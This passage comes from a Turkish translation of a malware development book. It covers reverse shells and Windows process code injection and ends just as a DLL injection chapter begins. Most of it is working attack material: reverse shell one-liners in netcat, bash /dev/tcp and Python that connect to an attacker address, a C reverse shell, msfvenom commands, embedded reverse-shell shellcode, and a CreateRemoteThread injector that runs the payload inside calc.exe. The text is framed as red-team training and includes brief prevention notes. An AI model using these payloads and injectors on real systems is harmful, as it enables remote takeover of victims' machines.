Kasım 2024
MD MZ
2. baskı
Cocomelonc
Zhassulan Zhussupov
Zararlı yazılım geliştirme teknikleri, kriptografi ve Linux zararlı yazılımlarına giriş konularının araştırılması ve incelenmesi sonucu. Bedava(16 dolar)
                                                                            بسم الله الرحمن الرحيم
Bu kitap, eşim Laura'ya ve çocuklarım Yerzhan ile Munira'ya adanmıştır. Ayrıca, bu zorlu zamanlarda bana destek olan herkese teşekkür ederim. Bu kitabın satışından elde edilen gelirleri Munira’nın tedavisi için kullanacağım ve Kazakistan’daki hayır fonlarına bağışta bulunacağım.
Artık daha iyiyiz, ancak tedavimiz hala devam ediyor.  
Alemlerin Rabbi olan Allahtan kızıma şifa vermesini dileriz 
Bu kitap, **MD MZ - Zararlı Yazılım Geliştirme Kitabı - 2024 baskısı**nın yeni bir versiyonudur.  
Bu kitabın bu versiyonunu da inşallah yayımlamayı planlıyorum.

Kitabın ilk versiyonu 17.07.2022’da yayınlanmıştı

O zamandan beri iki yık geçmiştir ve kitabı blogumdaki yeni makalelerle tamamlamak istedim. Sonuç olarak, bu kitabın yeni baskısı şimdi neredeyse 1000 sayfa içeriyor.

2.Zararlı yazılım geliştirme nedir?
                                                                            بسم الله الرحمن الرحيم
İster Red Team ister Blue Team uzmanı olun, zararlı yazılım geliştirme tekniklerini ve yöntemlerini öğrenmek, gelişmiş saldırılar hakkında en kapsamlı bakış açısını sunar. Ayrıca, klasik zararlı yazılımların çoğu genellikle Windows ortamında yazıldığından, bu süreç Windows geliştirme konusunda pratik bilgi sağlar.  

Bu kitaptaki çoğu eğitim, Python ve C/C++ programlama dillerine derin bir hakimiyet gerektirir.

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>
int main() {
    unsigned char my_payload[] =
    "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
    "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
    "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
    "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
    "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
    "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
    "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
    "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
    "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
    "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
    "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
    "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
    "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
    "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
    "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
    "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
    "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
    "\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
    "\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
    "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
    "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
    "\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
    "\x2e\x2e\x5e\x3d\x00";
    
    LPVOID mem = VirtualAlloc(NULL, sizeof(my_payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    RtlMoveMemory(mem, my_payload, sizeof(my_payload));
    EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, (LPARAM)NULL);
    return 0;
    }

Bazen Nim programlama dilinde yazılmış bazı kodları anlamamız gerekebilir.
 import strutils
proc caesar(s: string, k: int, decode = false): string =
var k = if decode: 26 - k else: k
result = ""
for i in toUpper(s):
if ord(i) >= 65 and ord(i) <= 90:
result.add(chr((ord(i) - 65 + k) mod 26 + 65))
let msg = "The quick brown fox jumped over the lazy dogs"
echo msg
let enc = caesar(msg, 11)
echo enc
echo caesar(enc, 11, decode = true)
Kitabın ana yapısı beş (4 + 1 bonus) bölüme ayrılmıştır:  
- Zararlı yazılım geliştirme teknikleri ve yöntemleri  
- Antivirüs atlatma yöntemleri  
- Kalıcılık teknikleri  
- Zararlı yazılımlar, Kriptografi, Araştırma  
- Linux zararlı yazılım geliştirmeye giriş  

Kitaptaki tüm içerik, blogumdaki yazılara dayanmaktadır.  
Sorularınız olursa, bana e-posta yoluyla ulaşabilirsiniz.  

Benim GitHub sayfam: [https://github.com/cocomelonc](https://github.com/cocomelonc)

3. Ters Kabuklar (Reverse Shells)
﷽
Öncelikle, ters kabuk (reverse shell) gibi bir kavramı ele alacağız, çünkü bu, zararlı yazılım geliştirme alanında oldukça önemli bir konudur.
Öncelikle, ters kabuk (reverse shell) gibi bir kavramı inceleyeceğiz, çünkü bu, zararlı yazılım geliştirme alanında oldukça önemli bir konudur.
Ters kabuk (reverse shell), genellikle 80, 443, 8080 gibi yaygın çıkış portlarından yararlanabilir.  
Ters kabuk, genellikle hedef makinenin güvenlik duvarı tarafından belirli portlardan gelen bağlantıları engellediği durumlarda kullanılır. Bu güvenlik duvarı kısıtlamasını aşmak için, Red Team uzmanları ve pentesterler ters kabuklar kullanır.
Ancak, burada bir uyarı var: Bu durum, saldırganın kontrol sunucusunu açığa çıkarabilir ve hedef ağın ağ güvenlik izleme hizmetleri tarafından izler tespit edilebilir.  

Ters kabuk elde etmek için üç adım vardır:  
1. Öncelikle, saldırgan hedef sistemde veya ağda bir güvenlik açığından yararlanarak kod çalıştırma yeteneği elde eder.  
2. Daha sonra, saldırgan kendi makinesinde bir dinleyici (listener) kurar.  
3. Son olarak, saldırgan, güvenlik açığını sömürmek için savunmasız sisteme ters kabuk kodu enjekte eder.  

Bir başka önemli nokta daha var: Gerçek siber saldırılarda ters kabuk, sosyal mühendislik yoluyla da elde edilebilir. Örneğin, bir oltalama e-postası veya kötü amaçlı bir web sitesi aracılığıyla yerel bir iş istasyonuna yüklenen bir zararlı yazılım, bir komut sunucusuna giden bir bağlantı başlatabilir ve saldırganlara ters kabuk yeteneği sağlayabilir.

Bu yazının amacı, hedef ana bilgisayar veya ağdaki bir güvenlik açığını istismar etmek değil, kod yürütmeyi gerçekleştirmek için kullanılabilecek bir güvenlik açığı bulma fikrini anlatmaktır.
Hedef sistemde hangi işletim sisteminin kurulu olduğuna ve hangi servislerin çalıştığına bağlı olarak ters kabuk türü farklı olabilir; örneğin, PHP, Python, JSP v.b dillerde olabilir.
Bu yazının amacı, hedef ana bilgisayar veya ağdaki bir güvenlik açığını istismar etmek değil, kod yürütmeyi gerçekleştirmek için kullanılabilecek bir güvenlik açığı bulma fikrini anlatmaktır.  

Hedef sistemde hangi işletim sisteminin kurulu olduğuna ve hangi servislerin çalıştığına bağlı olarak ters kabuk türü farklı olabilir; örneğin, PHP, Python, JSP gibi dillerde olabilir.  

Dinleyici (Listener)
Basitlik açısından, bu örnekte hedef sistemin herhangi bir port üzerinden dışarıya bağlantıya izin verdiğini varsayıyoruz (varsayılan iptables güvenlik duvarı kuralı). Bu durumda, dinleyici portu olarak 4444 kullanıyoruz. Ancak, istediğiniz başka bir portu da seçebilirsiniz.  

Dinleyici, TCP/UDP bağlantılarını veya soketlerini açabilen herhangi bir program ya da araç olabilir. Çoğu durumda, ben genellikle **nc** veya **netcat** aracını kullanmayı tercih ediyorum.  

nc -lvp 4444

- **-l**: Dinleme modunu etkinleştirir.  
- **-v**: Ayrıntılı mod (verbose).  
- **-p**: Dinlenecek portu belirtir (burada 4444).  
- **-n** (isteğe bağlı): DNS çözümlemesi yerine yalnızca sayısal IP adreslerini kullanır.  

Bu komut, her arayüzde port 4444 üzerinden gelen bağlantıları dinlemek için ayarlanmıştır. Ters kabuk bağlantısı sağlandıktan sonra, saldırgan bu dinleyici üzerinden hedef sistemle iletişim kurabilir.

Ters kabuğu çalıştırma(örnekler)
Yine basitlik açısından, örneklerimizde hedef bir Linux makinesi olarak belirlenmiştir.Netcat kullanımı: nc -e /bin/sh 10.9.1.6 4444
Bu yazılımda 10.9.1.6 4444 saldırı yapılacak aracın İP adresi ve 4444 dinlenen port
2.Netcat’ı -e’siz kullanma:
Yeni Linux sistemlerde, varsayılan olarak GAPING_SECURITY_HOLE devre dışı bırakılmış netcat kullanılmaktadır, bu da netcat'in -e seçeneğinin mevcut olmadığı anlamına gelir. Bu durumda, ters kabuk oluşturmak için şu komut kullanılabilir: mkfifo /tmp/p; nc <LHOST> <LPORT> 0</tmp/p |
/bin/sh > /tmp/p 2>&1; rm /tmp/p
Burada, ilk olarak mkfifo komutunu kullanarak p adlı adlandırılmış bir pipe(AKA FIFO) oluşturdum.MKFIFO komutu, dosya sisteminde bir nesne oluşturur ve bu durumda, p adında bir "geri kanal" (backpipe) oluşturdum. Bu geri kanal, adlandırılmış bir boru (named pipe) türündedir. Bu FIFO, verileri shell'in girdisine taşıma amacıyla kullanılacaktır. Geri kanalımı /tmp dizininde oluşturdum, çünkü neredeyse her hesap bu dizine yazma yetkisine sahiptir. Bu, saldırıyı gerçekleştirirken izin sorunlarından kaçınmayı sağlar.

3.Bash
Bu yöntem, eski Debian tabanlı Linux dağıtımlarında çalışmayabilir.Kod: bash -c 'sh -i >& /dev/tcp/10.9.1.6/4444 0>&1'
4. Python
Yarı etkileşimli bir shell oluşturmak için Python kullanabilirsiniz. Hedef makinede şu komutu çalıştırabilirsiniz:
python -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("<LHOST>",<LPORT>));
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
Daha detaylı örnekler: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

C ile Ters Kabuk(Reverse Shell) oluşturma
En sevdiğim kısım. Siber güvenliğe programlama geçmişiyle geldiğimden beri, “Tekerleği yeniden icat etmek” yani,bir şeylerle uğraşmaktan keyif alıyorum ve bu öğrenme yolu bazı şeyleri anlamak için yardımcı oluyor.
Dediğim gibi şimdi Linux hedef makinesi için bir ters kabuk yazalım.


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <string.h>

int main() {
    int sock;
    struct sockaddr_in server;

    // Hedef saldırganın IP ve port bilgileri
    const char *ip = "<LHOST>";
    int port = <LPORT>;

    // Soket oluşturma
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("Socket oluşturulamadı");
        exit(1);
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(ip);

    // Sunucuya bağlanma
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == -1) {
        perror("Bağlantı kurulamadı");
        close(sock);
        exit(1);
    }

    // Standart giriş, çıkış ve hata akışlarını sokete yönlendirme
    dup2(sock, 0); // stdin
    dup2(sock, 1); // stdout
    dup2(sock, 2); // stderr

    // Shell başlatma
    execve("/bin/sh", NULL, NULL);

    return 0;
}
Kodu derleyelim:
gcc -o shell shell.c -w
Eğer 32-bitlik Linux makinesinde derliyorsanız:gcc -o shell -m32 shell.c -w
Dosyayı hedef makineye aktarmayı başlayalım. Dosya aktarımı, sömürü sonrası (post-exploitation) aşamalarında en önemli adımlardan biri olarak kabul edilir. Burada, netcat aracını kullanarak bu işlemi gerçekleştireceğiz. Netcat, bir hackerın İsviçre çakısı olarak bilinir. 
Hedef makinede çalıştır: nc -lvp 4444 > shell
Saldırgan makinede çalıştır: nc 10.9.1.19 4444 -w 3 < shell
Kontrol etmek için:  ./shell
Kaynak kodu Git hub’tan bulursunuz: https://github.com/cocomelonc/2021-09-11-reverse-shells
**Önleme**  
Ne yazık ki, ters kabukları tamamen engellemenin bir yolu yoktur. Ters kabukları uzaktan yönetim amacıyla bilinçli olarak kullanmadığınız sürece, herhangi bir ters kabuk bağlantısı muhtemelen kötü niyetlidir. Sömürüyü sınırlamak için, yalnızca gerekli hizmetler için belirli uzak IP adreslerine ve portlara izin vererek çıkış bağlantılarını kısıtlayabilirsiniz. Bu, sanal bir ortamda çalıştırarak veya sunucuyu minimal bir konteyner içinde çalıştırarak gerçekleştirilebilir.

4. Klasik Kod Enjeksiyonu İşlemine: Basit C++ Zararlı Yazılım
Kod enjeksiyonu hakkında konuşalım. Kod enjeksiyonu nedir ve neden yaparız?
Kod enjeksiyonu tekniği, bir işlemin (bizim durumumuzda zararlı yazılımımız), başka bir çalışan sürece kod enjekte etmesi yöntemidir.
Örneğin, elinizde bir zararlı yazılım var. Bu, bir phishing saldırısından gelen bir dropper veya hedefinize ulaştırmayı başardığınız bir trojan olabilir ya da kodunuzu çalıştıran herhangi bir şey olabilir.Ve bir sebeplerden dolayı payload’ı başka bir işlemde çalıştırmak istemiş olabilirsiniz.Bu ne anlama geliyor?Bu yazıda amacımız bir trojan yaratmak değil,mesela diyelim payload’ınız bir Word.exe dosyasının içinde çalıştırılabilir ama bunun da çalışma zamanı kısıtlı oluyor. Diyelim ki uzaktan bir shell elde ettiniz, ancak kurbanınız word.exe'yi kapattı. Bu durumda, oturumunuzu korumak istiyorsanız başka bir sürece geçmeniz gerekir.
Bu yazıda, Debugging API kullanarak payload enjeksiyonu yapan klasik bir tekniği tartışacağız.
İlk önce payload’ımızı hazırlamış olalım. Basitlik açısından, Kali Linux'tan msfvenom ters kabuk yükü kullanacağız.
Saldırganın makinsesinde çalıştır: msfvenom -p windows/x64/shell_reverse_tcp
LHOST=10.9.1.6 LPORT=4444 -f c
Burda 10.9.1.6 saldırgan makinesinin adresi,4444 ise sonra dinleyeceğimiz port oluyor.
Zararlı yazılımımızın basit bir C++ koduyla başlayalım:
/*
cpp implementation malware example with msfvenom payload
*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// our payload: reverse shell (msfvenom)
unsigned char my_payload[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
"\x49\x89\xe5\x49\xbc\x02\x00\x11\x5c\x0a\x09\x01\x06\x41\x54"
"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c"
"\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff"
"\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2"
"\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"
"\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99"
"\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x49\xb8\x63"
"\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57"
"\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44"
"\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6"
"\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff"
"\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5"
"\x48\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
"\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
"\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";

unsigned int my_payload_len = sizeof(my_payload);

int main(void) {
    void *my_payload_mem; // memory buffer for payload
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;

    // Allocate a memory buffer for payload
    my_payload_mem = VirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to buffer
    RtlMoveMemory(my_payload_mem, my_payload, my_payload_len);

    // make new buffer as executable
    rv = VirtualProtect(my_payload_mem, my_payload_len, PAGE_EXECUTE_READ, &oldprotect);

    if (rv != 0) {
        // run payload
        th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)my_payload_mem, 0, 0, 0);
        WaitForSingleObject(th, -1);
    }

    return 0;
}


Kodun çoğunu anlamazsanız sorun değil.İleride bu tür benzer hileleri ve kod parçalarını sık sık kullanacağım. Kitabı okudukça, kavramları ve temel şeyleri daha iyi anlayacaksınız.
İlk önce kontrol edlelim.
Derleyelim: x86_64-w64-mingw32-gcc evil.cpp -o evil.exe -s
	          -ffunction-sections -fdata-sections -Wno-write-strings
		-fno-exceptions -fmerge-all-constants -static-libstdc++
                     -static-libgcc
Dinleyicimici de hazırlayalım: nc -lvp 4444
Ve hedef makinesinde çalıştıralım: ./evil.exe
Gördüğünüz her şey doğru. evil.exe'yi incelemek için Process Hacker'ı kullanacağız. Process Hacker, bir cihazda hangi işlemlerin çalıştığını görmenize, CPU kaynaklarını tüketen programları tanımlamanıza ve bir işlemle ilişkili ağ bağlantılarını belirlemenize olanak tanıyan açık kaynaklı bir araçtır.
Ardından, Ağ (Network) sekmesinde, işlemimizin 10.9.1.6:4444 (saldırganın makinesi) ile bağlantı kurduğunu göreceğiz:
Şimdi payload’ımzı bir sürece enjekte edelim. Örneğin, calc.exe.
Yapmak istediğiniz şey, bir hedef sürece geçmek veya başka bir deyişle,payload’ınızın aynı makinedeki başka bir süreçte (örneğin calc.exe içinde) bir şekilde çalışmasını sağlamaktır.
77777777777777
İlk adım, hedef süreciniz içinde bir miktar bellek ayırmaktır ve tamponun boyutu, en azından payload'unuzun boyutu kadar olmalıdır:
77777777777777
Daha sonra payload'unuzu, calc.exe hedef sürecine ayrılmış belleğe kopyalarsınız:
777777777777777
Ardından, sistemden payload'unuzu hedef süreçte, yani calc.exe'de çalıştırmaya başlamasını "isteyin":
7777777777777
Şimdi bu basit mantığı kodlayalım.
Bunu yapmak için en yaygın yöntem, Windows'un hata ayıklama (debugging) amaçlı sağladığı yerleşik API işlevlerini kullanmaktır. Bunlar şunlardır:
VirtualAllocEx
WriteProcessMemory
CreateRemoteThread
Çok temel bir örnek:
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

// Reverse shell payload (without encryption)
unsigned char my_payload[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
"\x49\x89\xe5\x49\xbc\x02\x00\x11\x5c\x0a\x09\x01\x06\x41\x54"
"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c"
"\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff"
"\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2"
"\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"
"\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99"
"\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x49\xb8\x63"
"\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57"
"\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44"
"\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6"
"\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff"
"\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5"
"\x48\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
"\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
"\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";

unsigned int my_payload_len = sizeof(my_payload);

int main(int argc, char* argv[]) {
    HANDLE ph; // Process handle
    HANDLE rt; // Remote thread
    PVOID rb;  // Remote buffer

    // Parse process ID
    printf("PID: %i\n", atoi(argv[1]));

    // Open target process
    ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
    if (ph == NULL) {
        printf("Error: Unable to open process.\n");
        return 1;
    }

    // Allocate memory buffer for the remote process
    rb = VirtualAllocEx(ph, NULL, my_payload_len, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if (rb == NULL) {
        printf("Error: Unable to allocate memory in target process.\n");
        CloseHandle(ph);
        return 1;
    }

    // "Copy" payload data into the allocated buffer
    if (!WriteProcessMemory(ph, rb, my_payload, my_payload_len, NULL)) {
        printf("Error: Unable to write to process memory.\n");
        VirtualFreeEx(ph, rb, 0, MEM_RELEASE);
        CloseHandle(ph);
        return 1;
    }

    // Create a remote thread in the target process
    rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);
    if (rt == NULL) {
        printf("Error: Unable to create remote thread.\n");
        VirtualFreeEx(ph, rb, 0, MEM_RELEASE);
        CloseHandle(ph);
        return 1;
    }

    CloseHandle(ph);
    return 0;
}
İlk olarak, işlemin PID'sini almanız gerekiyor. Bu PID'yi kendiniz girebilirsiniz.
Sonra, Kernel32 kütüphanesi tarafından sağlanan OpenProcess fonksiyonuyla işlemi açın:
777777777777777
Ardından, VirtualAllocEx kullanarak uzak işlem için bir bellek tamponu ayırabilirsiniz (1):
777777777777
Daha sonra, WriteProcessMemory kullanarak işlemler arasında veri kopyalayabilirsiniz, yani payload'u calc.exe işlemine kopyalayın (2).
Ve CreateRemoteThread, CreateThread fonksiyonuna benzer, ancak bu fonksiyonda hangi işlemin yeni bir thread başlatacağını belirtebilirsiniz (3).
Şimdi bu kodu derleyelim:
x86_64-w64-mingw32-gcc evil_inj.cpp -o evil2.exe -s
-ffunction-sections -fdata-sections -Wno-write-strings
-fno-exceptions -fmerge-all-constants -static-libstdc++
-static-libgcc
777777777777
Dinleyiciyi hazırlayalım:
nc -lvp 4444
ve ilk önce hedef makinesinde calc.exe çalıştıralım:
7777777777777777
calc.exe'nin işlem kimliğinin (PID) 1844 olduğunu görebiliriz.
Daha sonra hedef makinede enjektörümüzü çalıştırın:
.\evil2.exe 1844

7777777777777
Ve öncelikle, calc.exe'nin ID'sinin aynı olduğunu ve evil2.exe'nin yeni bir işlem olan cmd.exe'yi oluşturduğunu görebiliriz. Ayrıca, Ağ (Network) sekmesinde payload'umuzun çalıştığını görebiliriz (çünkü calc.exe saldırganın makinesiyle bağlantı kuruyor):
7777777777777777
Daha sonra, calc.exe sürecini inceleyelim.
Memory (Bellek) sekmesine gidin ve ayırdığımız bellek tamponunu arayın.
777777777777
Çünkü kaynak koda bakarsanız, uzak süreçte çalıştırılabilir ve okunabilir bir bellek tamponu ayırıyoruz:
777777777
Bu nedenle, Process Hacker'da arama yapabilir ve korumaya göre sıralayabilirsiniz. Aşağı kaydırarak hem okunabilir hem de çalıştırılabilir olan bir bölgeyi bulun:
777777777
calc.exe'nin belleğinde bu türden birçok bölge bulunabilir. Ancak, calc.exe'nin ws2_32.dll modülünü yüklediğine dikkat edin, bu normal koşullarda asla olmamalıdır, çünkü bu modül soket yönetiminden sorumludur:
7777777777
Bu şekilde kodunuzu başka bir sürece enjekte edebilirsiniz. Ancak, burada bir uyarı var. Yazma erişimi ile başka bir süreci açmak belirli kısıtlamalara tabidir. Bu korumalardan biri Mandatory Integrity Control (MIC) olarak adlandırılır. MIC, nesnelere erişimi "Bütünlük seviyesi" temelinde kontrol eden bir koruma yöntemidir.
Integrity seviyeleri şunlardır:  
- low level - Sistemin çoğuna erişimi kısıtlanmış süreçler (örneğin, Internet Explorer).  
- medium level - Ayrıcalıklı olmayan kullanıcılar tarafından başlatılan herhangi bir süreç için varsayılan seviye ve ayrıca UAC etkinse yönetici kullanıcıları için de geçerlidir.  
- high level - Yönetici ayrıcalıklarıyla çalışan süreçler.  
- system level - SYSTEM kullanıcıları tarafından, genellikle en yüksek koruma gerektiren sistem hizmetleri ve süreçler için kullanılır.  

Şimdilik bu konuya fazla girmeyeceğiz. Öncelikle bunu kendim anlamaya çalışacağım.  

VirtualAllocEx  
WriteProcessMemory  
CreateRemoteThread  
OpenProcess  
Kaynak kod Git hub’ta: https://github.com/cocomelonc/2021-09-19-injection-1
5. Klasik DLL enjeksiyonu işlemi. Basit C++ zararlı yazılım.
Bismillah in Arabic 
Bu bölümde, debugging API kullanılarak yapılan klasik bir DLL enjeksiyonu tekniğini ele alacağız.  
Klasik kod enjeksiyonundan önceki bölümde bahsetmiştim.

Öncelikle, DLL'imizi hazırlayalım.  
EXE ve DLL yazımında bazı küçük farklar vardır. Temel fark, modülünüzde veya programınızda kodunuzu nasıl çağırdığınızdır.  

EXE durumunda, işletim sistemi yükleyicisinin yeni bir sürecin tüm başlatma işlemlerini tamamladığında çağırdığı bir **main** fonksiyonu bulunmalıdır. Bu noktada, işletim sistemi yükleyicisi işini bitirdiğinde programınız çalışmaya başlar.  

Öte yandan, programınızı dinamik bir kütüphane olarak (DLL) çalıştırmak istediğinizde, durum biraz farklıdır. Yükleyici zaten bellekte bir süreç oluşturmuş olur ve bu süreç, bir şekilde DLL'inize veya başka bir DLL'e ihtiyaç duyar. Bu, DLL'inizin uyguladığı bir fonksiyon nedeniyle olabilir.  

Özetle:  
- EXE bir **main** fonksiyonuna ihtiyaç duyar.  
- DLL ise bir **DLLMain** fonksiyonuna ihtiyaç duyar.  

Bu, en temel farktır.  

Basitlik açısından, yalnızca bir mesaj kutusu açan bir DLL oluşturacağız:  
/*
evil.cpp
